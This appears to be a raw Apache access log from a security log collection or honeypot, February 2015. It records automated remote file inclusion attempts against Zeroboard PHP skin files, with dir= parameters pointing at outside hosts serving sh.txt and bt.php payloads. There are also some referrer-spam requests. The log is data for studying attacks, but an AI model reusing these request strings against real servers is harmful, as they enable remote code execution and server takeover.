80.68.145.110 - - [16/Feb/2015:18:28:06 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
74.208.16.118 - - [16/Feb/2015:18:28:21 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
203.58.0.155 - - [16/Feb/2015:18:28:22 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
74.208.16.118 - - [16/Feb/2015:18:28:22 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
74.208.16.118 - - [16/Feb/2015:18:28:22 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
74.208.16.118 - - [16/Feb/2015:18:28:23 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
203.58.0.155 - - [16/Feb/2015:18:28:23 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
203.58.0.155 - - [16/Feb/2015:18:28:24 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
203.58.0.155 - - [16/Feb/2015:18:28:25 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
211.47.181.38 - - [16/Feb/2015:18:29:15 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
211.47.181.38 - - [16/Feb/2015:18:29:17 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
211.47.181.38 - - [16/Feb/2015:18:29:18 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
211.47.181.38 - - [16/Feb/2015:18:29:19 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
176.31.252.38 - - [16/Feb/2015:18:29:23 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [16/Feb/2015:18:29:24 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [16/Feb/2015:18:29:24 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [16/Feb/2015:18:29:25 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [16/Feb/2015:18:29:34 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [16/Feb/2015:18:29:35 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [16/Feb/2015:18:29:35 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [16/Feb/2015:18:29:36 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [16/Feb/2015:18:29:38 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [16/Feb/2015:18:29:38 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [16/Feb/2015:18:29:39 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [16/Feb/2015:18:29:39 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [16/Feb/2015:18:29:40 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [16/Feb/2015:18:29:40 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [16/Feb/2015:18:29:41 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [16/Feb/2015:18:29:41 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [16/Feb/2015:18:29:48 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
176.31.252.38 - - [16/Feb/2015:18:29:49 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
176.31.252.38 - - [16/Feb/2015:18:29:49 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
176.31.252.38 - - [16/Feb/2015:18:29:50 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
211.47.181.38 - - [16/Feb/2015:18:31:42 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
1.224.163.80 - - [16/Feb/2015:18:31:44 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6" 
1.224.163.80 - - [16/Feb/2015:18:31:47 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6" 
211.47.181.38 - - [16/Feb/2015:18:31:48 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
1.224.163.80 - - [16/Feb/2015:18:31:48 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6" 
211.47.181.38 - - [16/Feb/2015:18:31:48 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
1.224.163.80 - - [16/Feb/2015:18:31:51 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6" 
211.47.181.38 - - [16/Feb/2015:18:31:51 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
181.65.186.35 - - [16/Feb/2015:18:32:05 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
181.65.186.35 - - [16/Feb/2015:18:32:06 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
181.65.186.35 - - [16/Feb/2015:18:32:07 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
181.65.186.35 - - [16/Feb/2015:18:32:08 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
74.208.16.118 - - [16/Feb/2015:18:34:10 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
74.208.16.118 - - [16/Feb/2015:18:34:11 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
74.208.16.118 - - [16/Feb/2015:18:34:11 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
74.208.16.118 - - [16/Feb/2015:18:34:12 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
37.9.169.17 - - [16/Feb/2015:18:35:30 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
37.9.169.17 - - [16/Feb/2015:18:35:31 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
37.9.169.17 - - [16/Feb/2015:18:35:32 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
37.9.169.17 - - [16/Feb/2015:18:35:33 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
176.31.252.38 - - [16/Feb/2015:18:38:29 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Gigabot/3.0 (http://www.gigablast.com/spider.html)" 
176.31.252.38 - - [16/Feb/2015:18:38:31 -0800] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Gigabot/3.0 (http://www.gigablast.com/spider.html)" 
176.31.252.38 - - [16/Feb/2015:18:38:31 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Gigabot/3.0 (http://www.gigablast.com/spider.html)" 
176.31.252.38 - - [16/Feb/2015:18:38:32 -0800] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Gigabot/3.0 (http://www.gigablast.com/spider.html)" 
182.52.40.64 - - [16/Feb/2015:18:51:32 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930836 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0" 
46.119.115.79 - - [16/Feb/2015:18:58:43 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://getbot.guru/?pr=0bb7f2d00d979929148f79c3917b9371" "Mozilla/4.0 (compatible; MSIE 4.01; Digital AlphaServer 1000A 4/233; Windows NT; Powered By 64-Bit Alpha Processor)" 
46.119.115.79 - - [16/Feb/2015:18:58:44 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://getbot.guru/?pr=0bb7f2d00d979929148f79c3917b9371" "Mozilla/4.0 (compatible; MSIE 4.01; Digital AlphaServer 1000A 4/233; Windows NT; Powered By 64-Bit Alpha Processor)" 
46.119.115.79 - - [16/Feb/2015:18:58:44 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://getbot.guru/?pr=0bb7f2d00d979929148f79c3917b9371" "Mozilla/4.0 (compatible; MSIE 4.01; Digital AlphaServer 1000A 4/233; Windows NT; Powered By 64-Bit Alpha Processor)" 
178.137.92.19 - - [16/Feb/2015:19:05:35 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://xxlslots.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322) NS8/0.9.6" 
178.137.92.19 - - [16/Feb/2015:19:05:35 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://blogig.org/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322) NS8/0.9.6" 
178.137.92.19 - - [16/Feb/2015:19:05:36 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://blogig.org/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322) NS8/0.9.6" 
178.137.92.19 - - [16/Feb/2015:19:05:36 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://blogig.org/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322) NS8/0.9.6" 
178.137.92.19 - - [16/Feb/2015:19:05:36 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://xxlslots.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322) NS8/0.9.6" 
178.137.92.19 - - [16/Feb/2015:19:05:37 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://xxlslots.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322) NS8/0.9.6" 
181.65.186.35 - - [16/Feb/2015:19:12:26 -0800] "GET /honeypot////bbs/skin/ggambo5100_board/write.php?dir=http://koreahr.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
181.65.186.35 - - [16/Feb/2015:19:12:28 -0800] "GET /honeypot////bbs/skin/ggambo5100_board/write.php?dir=http://koreahr.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
181.65.186.35 - - [16/Feb/2015:19:12:29 -0800] "POST /honeypot////bbs/skin/ggambo5100_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
181.65.186.35 - - [16/Feb/2015:19:12:30 -0800] "POST /honeypot////bbs/skin/ggambo5100_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
181.65.186.35 - - [16/Feb/2015:19:12:31 -0800] "GET ////bbs/skin/ggambo5100_board/write.php?dir=http://koreahr.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
181.65.186.35 - - [16/Feb/2015:19:12:32 -0800] "GET ////bbs/skin/ggambo5100_board/write.php?dir=http://koreahr.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
181.65.186.35 - - [16/Feb/2015:19:12:32 -0800] "POST ////bbs/skin/ggambo5100_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
181.65.186.35 - - [16/Feb/2015:19:12:34 -0800] "POST ////bbs/skin/ggambo5100_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
176.31.252.38 - - [16/Feb/2015:20:12:05 -0800] "GET /honeypot////bbs/skin/ggambo6210_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [16/Feb/2015:20:12:06 -0800] "GET /honeypot////bbs/skin/ggambo6210_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [16/Feb/2015:20:12:07 -0800] "POST /honeypot////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [16/Feb/2015:20:14:15 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [16/Feb/2015:20:14:16 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [16/Feb/2015:20:14:16 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [16/Feb/2015:20:14:17 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
91.207.8.46 - - [16/Feb/2015:20:33:44 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://prigatour.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)" 
91.207.8.46 - - [16/Feb/2015:20:33:44 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://prigatour.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)" 
91.207.8.46 - - [16/Feb/2015:20:33:45 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://prigatour.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)" 
176.31.252.38 - - [16/Feb/2015:20:52:52 -0800] "GET ////bbs/skin/ikkelim_bbs05/setup.php?dir=http://www.geepower.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [16/Feb/2015:20:52:53 -0800] "GET ////bbs/skin/ikkelim_bbs05/setup.php?dir=http://www.geepower.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [16/Feb/2015:20:52:53 -0800] "POST ////bbs/skin/ikkelim_bbs05/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [16/Feb/2015:20:52:54 -0800] "POST ////bbs/skin/ikkelim_bbs05/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
212.34.151.164 - - [16/Feb/2015:20:53:31 -0800] "GET ////bbs/skin/ikkelim_bbs05/setup.php?dir=http://www.geepower.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
212.34.151.164 - - [16/Feb/2015:20:53:32 -0800] "GET ////bbs/skin/ikkelim_bbs05/setup.php?dir=http://www.geepower.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
212.34.151.164 - - [16/Feb/2015:20:53:32 -0800] "POST ////bbs/skin/ikkelim_bbs05/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
212.34.151.164 - - [16/Feb/2015:20:53:34 -0800] "POST ////bbs/skin/ikkelim_bbs05/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
1.224.163.80 - - [16/Feb/2015:20:53:57 -0800] "GET ////bbs/skin/ikkelim_bbs05/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/3.0 (OS/2; U)" 
1.224.163.80 - - [16/Feb/2015:20:54:00 -0800] "GET ////bbs/skin/ikkelim_bbs05/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/3.0 (OS/2; U)" 
1.224.163.80 - - [16/Feb/2015:20:54:01 -0800] "POST ////bbs/skin/ikkelim_bbs05/setup.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (OS/2; U)" 
1.224.163.80 - - [16/Feb/2015:20:54:04 -0800] "POST ////bbs/skin/ikkelim_bbs05/setup.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (OS/2; U)" 
49.50.76.8 - - [16/Feb/2015:20:57:19 -0800] "GET ////bbs/skin/minkoon_link_skyblue/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
49.50.76.8 - - [16/Feb/2015:20:57:21 -0800] "GET ////bbs/skin/minkoon_link_skyblue/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
49.50.76.8 - - [16/Feb/2015:20:57:22 -0800] "POST ////bbs/skin/minkoon_link_skyblue/setup.php HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
49.50.76.8 - - [16/Feb/2015:20:57:24 -0800] "POST ////bbs/skin/minkoon_link_skyblue/setup.php HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
49.50.76.8 - - [16/Feb/2015:20:57:55 -0800] "GET ////bbs/skin/minkoon_link_skyblue/setup.php?dir=http://www.geepower.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)" 
49.50.76.8 - - [16/Feb/2015:20:57:57 -0800] "GET ////bbs/skin/minkoon_link_skyblue/setup.php?dir=http://www.geepower.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)" 
49.50.76.8 - - [16/Feb/2015:20:57:58 -0800] "POST ////bbs/skin/minkoon_link_skyblue/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)" 
49.50.76.8 - - [16/Feb/2015:20:57:59 -0800] "POST ////bbs/skin/minkoon_link_skyblue/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)" 
212.34.151.164 - - [16/Feb/2015:20:58:37 -0800] "GET ////bbs/skin/minkoon_link_skyblue/setup.php?dir=http://www.geepower.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
212.34.151.164 - - [16/Feb/2015:20:58:38 -0800] "GET ////bbs/skin/minkoon_link_skyblue/setup.php?dir=http://www.geepower.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
212.34.151.164 - - [16/Feb/2015:20:58:41 -0800] "POST ////bbs/skin/minkoon_link_skyblue/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
212.34.151.164 - - [16/Feb/2015:20:58:43 -0800] "POST ////bbs/skin/minkoon_link_skyblue/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
